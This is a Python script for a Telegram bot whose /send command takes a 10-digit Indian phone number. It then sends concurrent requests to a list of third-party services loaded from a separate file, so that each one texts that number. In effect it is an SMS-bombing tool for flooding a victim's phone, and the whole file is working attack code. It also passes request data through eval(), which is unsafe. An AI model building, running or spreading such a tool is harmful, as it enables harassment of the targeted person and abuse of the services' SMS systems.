import os
import asyncio
import logging
import re
from dotenv import load_dotenv
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import aiohttp
import async_timeout

load_dotenv()

# === CONFIG ===
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
ALLOWED_USERS = [int(id) for id in os.getenv("ALLOWED_USERS", "").split(",") if id]
REQUEST_TIMEOUT = 10
MAX_CONCURRENT = 50

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# === SERVICES IMPORT (sms.py se load karega) ===
try:
    from services import services
except ImportError:
    # Agar services.py nahi hai toh sms.py ko clean karke services.py banayega
    with open('sms.py', 'r') as f:
        content = f.read()
    # Comments hatao
    content = re.sub(r'#.*$', '', content, flags=re.MULTILINE)
    content = re.sub(r'//.*$', '', content, flags=re.MULTILINE)
    with open('services.py', 'w') as f:
        f.write(content)
    from services import services

# === SEND FUNCTION ===
async def send_sms(session, service, phone):
    url = service["url"]
    method = service.get("method", "POST").upper()
    headers = service.get("headers", {})
    data = service["data"](phone)  # lambda call
    
    try:
        async with async_timeout.timeout(REQUEST_TIMEOUT):
            if method == "GET":
                resp = await session.get(url, headers=headers, params=eval(data))
            else:
                resp = await session.request(method, url, headers=headers, json=eval(data))
            status = resp.status
            await resp.text()
            return service["name"], status, None
    except Exception as e:
        return service["name"], None, str(e)

async def trigger_sms(phone):
    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [send_sms(session, svc, phone) for svc in services]
        results = await asyncio.gather(*tasks, return_exceptions=True)
    
    success = [r for r in results if isinstance(r, tuple) and r[1] and 200 <= r[1] < 300]
    failed = [r for r in results if not (isinstance(r, tuple) and r[1] and 200 <= r[1] < 300)]
    return success, failed

# === TELEGRAM COMMAND ===
async def send_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if ALLOWED_USERS and user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Access denied.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /send <10-digit phone>")
        return
    phone = context.args[0]
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text("❌ Valid 10-digit number daal.")
        return

    status_msg = await update.message.reply_text(f"⏳ +91{phone} pe bhej raha hu...")
    success, failed = await trigger_sms(phone)
    await status_msg.edit_text(f"✅ {len(success)} services pe bhej diya, {len(failed)} fail.")

def main():
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("send", send_command))
    app.run_polling()

if __name__ == "__main__":
    main()
